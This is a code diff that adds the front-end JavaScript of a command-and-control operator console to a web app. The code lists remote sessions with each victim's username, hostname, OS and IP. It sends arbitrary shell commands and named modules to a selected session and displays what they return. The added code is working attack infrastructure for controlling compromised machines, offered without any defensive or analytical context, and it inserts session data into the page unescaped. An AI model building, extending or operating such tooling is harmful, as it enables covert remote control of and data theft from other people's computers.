@@ -219,4 +219,197 @@ document.addEventListener('DOMContentLoaded', () => {
             submitBtn.disabled = false;
         }
     });
+    // ─── C2 Operator Console Logic ───
+    const c2SessionsBody = document.getElementById('c2-sessions-body');
+    const c2InteractPanel = document.getElementById('c2-interact-panel');
+    const c2ActiveSessionInfo = document.getElementById('c2-active-session');
+    const c2ResultsDiv = document.getElementById('c2-results');
+    const c2CmdInput = document.getElementById('c2-cmd-input');
+    const c2SendBtn = document.getElementById('c2-send-btn');
+    const refreshSessionsBtn = document.getElementById('refresh-sessions-btn');
+    const autoRefreshBtn = document.getElementById('auto-refresh-btn');
+    const c2QuickBtns = document.querySelectorAll('.c2-quick-btn');
+
+    let c2ActiveSessionId = null;
+    let c2AutoRefreshInterval = null;
+
+    async function fetchSessions() {
+        try {
+            const resp = await fetch('/api/c2/sessions');
+            const data = await resp.json();
+            
+            if (data.error) throw new Error(data.error);
+            
+            if (data.length === 0) {
+                c2SessionsBody.innerHTML = '<tr><td colspan="8" style="text-align: center; padding: 1rem; color: #a1a1aa;">No active sessions found.</td></tr>';
+                return;
+            }
+
+            c2SessionsBody.innerHTML = '';
+            data.forEach(s => {
+                const tr = document.createElement('tr');
+                tr.style.borderBottom = '1px solid rgba(255,255,255,0.05)';
+                const statusColor = s.status === 'active' ? '#10b981' : '#f43f5e';
+                const isSelected = s.id === c2ActiveSessionId;
+                if (isSelected) tr.style.background = 'rgba(255,255,255,0.05)';
+                
+                tr.innerHTML = `
+                    <td style="padding: 8px; font-family: monospace;">${s.id}</td>
+                    <td style="padding: 8px;">${s.username}</td>
+                    <td style="padding: 8px;">${s.hostname}</td>
+                    <td style="padding: 8px; max-width: 150px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis;" title="${s.os}">${s.os || 'Unknown'}</td>
+                    <td style="padding: 8px;">${s.ip}</td>
+                    <td style="padding: 8px; font-size: 0.85rem;">${s.last_seen}</td>
+                    <td style="padding: 8px; color: ${statusColor}; font-weight: 600;">${s.status.toUpperCase()}</td>
+                    <td style="padding: 8px;">
+                        <button class="btn-secondary interact-btn" data-id="${s.id}" style="padding: 0.2rem 0.6rem; font-size: 0.8rem;">
+                            ${isSelected ? 'Deselect' : 'Interact'}
+                        </button>
+                    </td>
+                `;
+                c2SessionsBody.appendChild(tr);
+            });
+
+            // Bind interact buttons
+            document.querySelectorAll('.interact-btn').forEach(btn => {
+                btn.addEventListener('click', (e) => {
+                    const sid = e.target.getAttribute('data-id');
+                    if (c2ActiveSessionId === sid) {
+                        c2ActiveSessionId = null;
+                        c2InteractPanel.classList.add('hidden');
+                    } else {
+                        c2ActiveSessionId = sid;
+                        c2ActiveSessionInfo.textContent = sid;
+                        c2InteractPanel.classList.remove('hidden');
+                        fetchResults();
+                    }
+                    fetchSessions(); // redraw selection highlight
+                });
+            });
+
+        } catch (err) {
+            console.error('Failed to fetch sessions:', err);
+        }
+    }
+
+    async function fetchResults() {
+        if (!c2ActiveSessionId) return;
+        try {
+            const resp = await fetch(`/api/c2/results/${c2ActiveSessionId}`);
+            const results = await resp.json();
+            
+            c2ResultsDiv.innerHTML = '';
+            if (results.length === 0) {
+                c2ResultsDiv.innerHTML = '<span style="color: #a1a1aa;">No command history.</span>';
+                return;
+            }
+
+            // Loop backwards (newest at bottom)
+            [...results].reverse().forEach(r => {
+                const item = document.createElement('div');
+                item.style.marginBottom = '1rem';
+                item.style.borderBottom = '1px dashed rgba(255,255,255,0.1)';
+                item.style.paddingBottom = '0.5rem';
+                
+                const statusColor = r.status === 'completed' ? '#10b981' : '#fbbf24';
+                
+                let outputHtml = '';
+                if (r.result) {
+                    outputHtml = `<pre style="margin-top: 0.5rem; color: #d1d5db; white-space: pre-wrap; word-break: break-all;">${r.result.replace(/</g, '&lt;').replace(/>/g, '&gt;')}</pre>`;
+                }
+                
+                item.innerHTML = `
+                    <div style="display: flex; gap: 0.5rem;">
+                        <span style="color: ${statusColor};">[#${r.id}]</span>
+                        <span style="color: #60a5fa;">$ ${r.command}</span>
+                    </div>
+                    ${outputHtml}
+                `;
+                c2ResultsDiv.appendChild(item);
+            });
+            c2ResultsDiv.scrollTop = c2ResultsDiv.scrollHeight;
+        } catch (err) {
+            console.error('Failed to fetch results:', err);
+        }
+    }
+
+    async function sendCommand(cmd, isModule=false, args=[]) {
+        if (!c2ActiveSessionId || !cmd) return;
+        try {
+            const url = isModule ? '/api/c2/module' : '/api/c2/command';
+            const payload = isModule 
+                ? { session_id: c2ActiveSessionId, module: cmd, args: args }
+                : { session_id: c2ActiveSessionId, command: cmd };
+                
+            const resp = await fetch(url, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(payload)
+            });
+            
+            const data = await resp.json();
+            if (data.error) {
+                alert('Command failed: ' + data.error);
+            } else {
+                c2CmdInput.value = '';
+                fetchResults(); // Refresh view immediately
+            }
+        } catch (err) {
+            alert('Failed to send command.');
+        }
+    }
+
+    // Bindings
+    refreshSessionsBtn.addEventListener('click', () => {
+        fetchSessions();
+        if (c2ActiveSessionId) fetchResults();
+    });
+
+    autoRefreshBtn.addEventListener('click', () => {
+        const isActive = autoRefreshBtn.getAttribute('data-active') === 'true';
+        if (isActive) {
+            clearInterval(c2AutoRefreshInterval);
+            c2AutoRefreshInterval = null;
+            autoRefreshBtn.setAttribute('data-active', 'false');
+            autoRefreshBtn.textContent = 'Auto: OFF';
+            autoRefreshBtn.classList.replace('btn-primary', 'btn-secondary');
+        } else {
+            c2AutoRefreshInterval = setInterval(() => {
+                fetchSessions();
+                if (c2ActiveSessionId) fetchResults();
+            }, 3000); // 3 sec default
+            autoRefreshBtn.setAttribute('data-active', 'true');
+            autoRefreshBtn.textContent = 'Auto: ON (3s)';
+            autoRefreshBtn.classList.replace('btn-secondary', 'btn-primary');
+        }
+    });
+
+    c2SendBtn.addEventListener('click', () => {
+        const rawCmd = c2CmdInput.value.trim();
+        if (!rawCmd) return;
+        
+        // Check if module shorthand (e.g. "@sysinfo")
+        if (rawCmd.startsWith('@')) {
+            const parts = rawCmd.substring(1).split(' ');
+            sendCommand(parts[0], true, parts.slice(1));
+        } else {
+            sendCommand(rawCmd, false);
+        }
+    });
+
+    c2CmdInput.addEventListener('keypress', (e) => {
+        if (e.key === 'Enter') c2SendBtn.click();
+    });
+
+    c2QuickBtns.forEach(btn => {
+        btn.addEventListener('click', (e) => {
+            const mod = e.target.getAttribute('data-mod');
+            sendCommand(mod, true);
+        });
+    });
+
+    // Initial load
+    fetchSessions();
+
 });
+
